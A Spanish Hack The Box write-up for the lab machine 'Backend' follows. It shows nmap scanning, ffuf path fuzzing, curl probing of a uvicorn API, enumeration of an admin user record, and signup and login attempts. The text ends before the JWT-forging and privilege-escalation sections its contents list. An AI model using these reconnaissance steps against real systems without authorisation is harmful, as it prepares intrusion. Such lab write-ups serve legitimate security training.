<!doctype html><html lang=es><head><title>Backend | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Máquina media. Esta máquina tiene una API en la que podemos crear una cuenta después de un proceso de exploración. Luego encontramos documentación en formato Swagger donde podemos ver una ruta para ejecutar comandos y para leer archivos del servidor. Necesitamos encontrar la clave secreta usada para los tokens JWT y crear un token válido para ejecutar comandos. Para comprometer esta máquina se necesitan conocimientos sobre tokens JWT y enumeración de API"><meta itemprop=description content="Hack The Box. Linux. Máquina media. Esta máquina tiene una API en la que podemos crear una cuenta después de un proceso de exploración. Luego encontramos documentación en formato Swagger donde podemos ver una ruta para ejecutar comandos y para leer archivos del servidor. Necesitamos encontrar la clave secreta usada para los tokens JWT y crear un token válido para ejecutar comandos. Para comprometer esta máquina se necesitan conocimientos sobre tokens JWT y enumeración de API"><meta name=twitter:description content="Hack The Box. Linux. Máquina media. Esta máquina tiene una API en la que podemos crear una cuenta después de un proceso de exploración. Luego encontramos documentación en formato Swagger donde podemos ver una ruta para ejecutar comandos y para leer archivos del servidor. Necesitamos encontrar la clave secreta usada para los tokens JWT y crear un token válido para ejecutar comandos. Para comprometer esta máquina se necesitan conocimientos sobre tokens JWT y enumeración de API"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una API en la que podemos crear una cuenta después de un proceso de exploración. Luego encontramos documentación en formato Swagger donde podemos ver una ruta para ejecutar comandos y para leer archivos del servidor. Necesitamos encontrar la clave secreta usada para los tokens JWT y crear un token válido para ejecutar comandos. Para comprometer esta máquina se necesitan conocimientos sobre tokens JWT y enumeración de API"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/HTB/Backend/Backend.png"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Backend/Backend.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Backend/Backend.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="Backend"><meta property="og:title" content="Backend"><meta property="og:url" content="https://7rocky.github.io/htb/backend/"><meta itemprop=keywords content="api,python,jwt,user-enumeration,static-code-analysis,password-reuse,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=/js/htb.js></script></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/htb/backend/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/backend/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/backend/&text=Backend" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/backend/&title=Backend" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Backend</h1><time class="f6 mv4 dib tracked" datetime=2022-04-12T00:00:00+01:00>12 / 04 / 2022</time></header><div class=htb-image><img alt=Backend src=/images/HTB/Backend/Backend.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/api title=API>API</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/python title=Python>Python</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/jwt title="JSON Web Token">JSON Web Token</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/user-enumeration title="Enumeración de usuarios">Enumeración de usuarios</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/static-code-analysis title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/password-reuse title="Reutilización de contraseñas">Reutilización de contraseñas</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#registrando-una-nueva-cuenta>Registrando una nueva cuenta</a></li><li><a href=#leyendo-documentación>Leyendo documentación</a></li><li><a href=#obteniendo-acceso-privilegiado>Obteniendo acceso privilegiado</a></li><li><a href=#leyendo-archivos-del-servidor>Leyendo archivos del servidor</a></li><li><a href=#intrusión-en-la-máquina>Intrusión en la máquina</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.161</li><li><strong>Fecha</strong>: 12 / 04 / 2022</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.161 -p 22,80
</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.161
</span></span><span style=display:flex><span>Host is up (0.21s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
</span></span><span style=display:flex><span>|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
</span></span><span style=display:flex><span>|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
</span></span><span style=display:flex><span>80/tcp open  http    uvicorn
</span></span><span style=display:flex><span>|_http-server-header: uvicorn
</span></span><span style=display:flex><span>| fingerprint-strings:
</span></span><span style=display:flex><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
</span></span><span style=display:flex><span>|     HTTP/1.1 400 Bad Request
</span></span><span style=display:flex><span>|     content-type: text/plain; charset=utf-8
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     Invalid HTTP request received.
</span></span><span style=display:flex><span>|   FourOhFourRequest:
</span></span><span style=display:flex><span>|     HTTP/1.1 404 Not Found
</span></span><span style=display:flex><span>|     date:
</span></span><span style=display:flex><span>|     server: uvicorn
</span></span><span style=display:flex><span>|     content-length: 22
</span></span><span style=display:flex><span>|     content-type: application/json
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     {&#34;detail&#34;:&#34;Not Found&#34;}
</span></span><span style=display:flex><span>|   GetRequest:
</span></span><span style=display:flex><span>|     HTTP/1.1 200 OK
</span></span><span style=display:flex><span>|     date:
</span></span><span style=display:flex><span>|     server: uvicorn
</span></span><span style=display:flex><span>|     content-length: 29
</span></span><span style=display:flex><span>|     content-type: application/json
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     {&#34;msg&#34;:&#34;UHC API Version 1.0&#34;}
</span></span><span style=display:flex><span>|   HTTPOptions:
</span></span><span style=display:flex><span>|     HTTP/1.1 405 Method Not Allowed
</span></span><span style=display:flex><span>|     date:
</span></span><span style=display:flex><span>|     server: uvicorn
</span></span><span style=display:flex><span>|     content-length: 31
</span></span><span style=display:flex><span>|     content-type: application/json
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|_    {&#34;detail&#34;:&#34;Method Not Allowed&#34;}
</span></span><span style=display:flex><span>|_http-title: Site doesn&#39;t have a title (application/json).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 80.81 seconds
</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id=enumeración-web>Enumeración web</h2><p>La máquina aloja una API, podemos interactuar con ella directamente desde línea de comandos con <code>curl</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161
{"msg":"UHC API Version 1.0"}

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -i 10.10.11.161
HTTP/1.1 200 OK
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>content-length</span>: 29
<span class=code-white>content-type</span>: application/json  

{"msg":"UHC API Version 1.0"}
</code></pre></div><p>Está montada con <code>uvicorn</code>. Si aplicamos <em>fuzzing</em>, veremos dos rutas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.161/FUZZ  
<span class=code-dark-yellow>docs                    [Status: 401, Size: 30, Words: 2, Lines: 1, Duration: 204ms]</span>
<span class=code-dark-green>api                     [Status: 200, Size: 20, Words: 1, Lines: 1, Duration: 155ms]
                        [Status: 200, Size: 29, Words: 4, Lines: 1, Duration: 198ms]</span>
</code></pre></div><p>No tenemos acceso a la ruta <code>/docs</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -i 10.10.11.161/docs
HTTP/1.1 401 Unauthorized
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>www-authenticate</span>: Bearer
<span class=code-white>content-length</span>: 30
<span class=code-white>content-type</span>: application/json  

{"detail":"Not authenticated"}
</code></pre></div><p>Y por otro lado, <code>/api</code> muestra una ruta más:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -i 10.10.11.161/api
HTTP/1.1 200 OK
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>content-length</span>: 20
<span class=code-white>content-type</span>: application/json  

{"endpoints":["v1"]}
</code></pre></div><p>Y dos rutas más:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -i 10.10.11.161/api/v1
HTTP/1.1 200 OK
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>content-length</span>: 30
<span class=code-white>content-type</span>: application/json  

{"endpoints":["user","admin"]}
</code></pre></div><p>Pero no podemos acceder directamente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -i 10.10.11.161/api/v1/user
HTTP/1.1 404 Not Found
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>content-length</span>: 22
<span class=code-white>content-type</span>: application/json

{"detail":"Not Found"}

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -i 10.10.11.161/api/v1/admin
HTTP/1.1 307 Temporary Redirect
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>location</span>: http://10.10.11.161/api/v1/admin/  
<span class=code-white>Transfer-Encoding</span>: chunked

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -i 10.10.11.161/api/v1/admin/
HTTP/1.1 401 Unauthorized
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>www-authenticate</span>: Bearer
<span class=code-white>content-length</span>: 30
<span class=code-white>content-type</span>: application/json

{"detail":"Not authenticated"}
</code></pre></div><p>Podemos tratar de aplicar <em>fuzzing</em> para ver más rutas aunque no tengamos permiso:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.161/api/v1/admin/FUZZ  
<span class=code-dark-yellow>file                    [Status: 405, Size: 31, Words: 3, Lines: 1, Duration: 115ms]</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -iX POST 10.10.11.161/api/v1/admin/file  
HTTP/1.1 401 Unauthorized
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>www-authenticate</span>: Bearer
<span class=code-white>content-length</span>: 30
<span class=code-white>content-type</span>: application/json

{"detail":"Not authenticated"}
</code></pre></div><p>Vemos que necesitamos autenticación, probablemente basada en JSON Web Token (JWT) debido a la cabecera de respuesta <code>www-authenticate: Bearer</code>.</p><p>Como necesitamos autenticarnos, tenemos que encontrar una manera de crear una cuenta. Vemos que <code>/api/v1/user/asdf</code> responde con información útil (de hechom cualquier palabra puesta después de <code>/api/v1/user/</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -i 10.10.11.161/api/v1/user/asdf
HTTP/1.1 422 Unprocessable Entity
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>content-length</span>: 104
<span class=code-white>content-type</span>: application/json

{"detail":[{"loc":["path","user_id"],"msg":"value is not a valid integer","type":"type_error.integer"}]}  

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -s 10.10.11.161/api/v1/user/asdf | <span class=code-dark-green>jq</span>
{
  <span class=code-blue>"detail"</span>: [
    {
      <span class=code-blue>"loc"</span>: [
        <span class=code-dark-green>"path"</span>,
        <span class=code-dark-green>"user_id"</span>
      ],
      <span class=code-blue>"msg"</span>: <span class=code-dark-green>"value is not a valid integer"</span>,
      <span class=code-blue>"type"</span>: <span class=code-dark-green>"type_error.integer"</span>
    }
  ]
}
</code></pre></div><p>Este error nos dice que el valor indicado no es un número entero. Por tanto, vamos a probar con un número:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -i 10.10.11.161/api/v1/user/1
HTTP/1.1 200 OK
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>content-length</span>: 141
<span class=code-white>content-type</span>: application/json

{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","email":"admin@htb.local","date":null,"time_created":1649533388111,"is_superuser":true,"id":1}  

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -s 10.10.11.161/api/v1/user/1 | <span class=code-dark-green>jq</span>
{
  <span class=code-blue>"guid"</span>: <span class=code-dark-green>"36c2e94a-4271-4259-93bf-c96ad5948284"</span>,
  <span class=code-blue>"email"</span>: <span class=code-dark-green>"admin@htb.local"</span>,
  <span class=code-blue>"date"</span>: <span class=code-grey>null</span>,
  <span class=code-blue>"time_created"</span>: 1649533388111,
  <span class=code-blue>"is_superuser"</span>: true,
  <span class=code-blue>"id"</span>: 1
}
</code></pre></div><p>Con esto, vemos que existen usuarios registrados en la API (enumeración de usuarios). Vamos a tratar de registrarnos.</p><h2 id=registrando-una-nueva-cuenta>Registrando una nueva cuenta</h2><p>El método HTTP usual para realizar esta acción en una API es POST:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -iX POST 10.10.11.161/api/v1/user/signup
HTTP/1.1 422 Unprocessable Entity
<span class=code-white>date</span>:
<span class=code-white>server</span>: uvicorn
<span class=code-white>content-length</span>: 81
<span class=code-white>content-type</span>: application/json

{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}  

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -sX POST 10.10.11.161/api/v1/user/signup | <span class=code-dark-green>jq</span>
{
  <span class=code-blue>"detail"</span>: [
    {
      <span class=code-blue>"loc"</span>: [
        <span class=code-dark-green>"body"</span>
      ],
      <span class=code-blue>"msg"</span>: <span class=code-dark-green>"field required"</span>,
      <span class=code-blue>"type"</span>: <span class=code-dark-green>"value_error.missing"</span>
    }
  ]
}
</code></pre></div><p>Este error es evidente porque no hemos puesto ningún cuerpo de petición. Vamos a usar un documento JSON vacío:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/user/signup -d <span class=code-dark-yellow>'{}'</span> -sH <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>jq</span>  
{
  <span class=code-blue>"detail"</span>: [
    {
      <span class=code-blue>"loc"</span>: [
        <span class=code-dark-green>"body"</span>,
        <span class=code-dark-green>"email"</span>
      ],
      <span class=code-blue>"msg"</span>: <span class=code-dark-green>"field required"</span>,
      <span class=code-blue>"type"</span>: <span class=code-dark-green>"value_error.missing"</span>
    },
    {
      <span class=code-blue>"loc"</span>: [
        <span class=code-dark-green>"body"</span>,
        <span class=code-dark-green>"password"</span>
      ],
      <span class=code-blue>"msg"</span>: <span class=code-dark-green>"field required"</span>,
      <span class=code-blue>"type"</span>: <span class=code-dark-green>"value_error.missing"</span>
    }
  ]
}
</code></pre></div><p>Y aquí vemos los campos requeridos: <code>email</code> y <code>password</code>. Ahora podemos crear la cuenta:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/user/signup -d <span class=code-dark-yellow>'{"email":"7rocky@htb.local","password":"asdffdsa"}''</span> -sH <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>jq</span>  
{}
</code></pre></div><p>No hay respuesta, pero podemos asumir que la cuenta se ha creado. Vamos a intentar iniciar sesión:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/user/login -d <span class=code-dark-yellow>'{"email":"7rocky@htb.local","password":"asdffdsa"}''</span> -sH <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>jq</span>  
{
  <span class=code-blue>"detail"</span>: [
    {
      <span class=code-blue>"loc"</span>: [
        <span class=code-dark-green>"body"</span>,
        <span class=code-dark-green>"username"</span>
      ],
      <span class=code-blue>"msg"</span>: <span class=code-dark-green>"field required"</span>,
      <span class=code-blue>"type"</span>: <span class=code-dark-green>"value_error.missing"</span>
    },
    {
      <span class=code-blue>"loc"</span>: [
        <span class=code-dark-green>"body"</span>,
        <span class=code-dark-green>"password"</span>
      ],
      <span class=code-blue>"msg"</span>: <span class=code-dark-green>"field required"</span>,
      <span class=code-blue>"type"</span>: <span class=code-dark-green>"value_error.missing"</span>
    }
  ]
}
</code></pre></div><p>Este error dice que <code>email</code> debería ser reemplazado por <code>username</code>. Pero tampoco funciona:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.161/api/v1/user/login -d <span class=code-dark-yellow>'{"username":"7rocky@htb.local","password":"asdffdsa"}''</span> -sH <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>jq</span>  
{
  <span class=code-blue>"detail"</span>: [
    {
      <span class=code-blue>"loc"</span>: [
        <span class=code-dark-green>"body"</span>,
        <span class=code-dark-green>"username"</span>
      ],
      <span class=code-blue>"msg"</span>: <span class=code-dark-green>"field required"</span>,
      <span class=code-blue>"type"</span>: <span class=code-dark-green>"value_error.missing"</span>
    },
    {
      <span class=code-blue>"loc"</span>: [
        <span class=code-dark-green>"body"</span>,
        <span class=code-dark-green>"password"</span>
      ],
      <span class=code-blue>"msg"</span>: <span class=code-dark-green>"field required"</span>,
      <span class=code-blue>"type"</span>: <span class=code-dark-green>"value_error.missing"</span>
    }
  ]
}
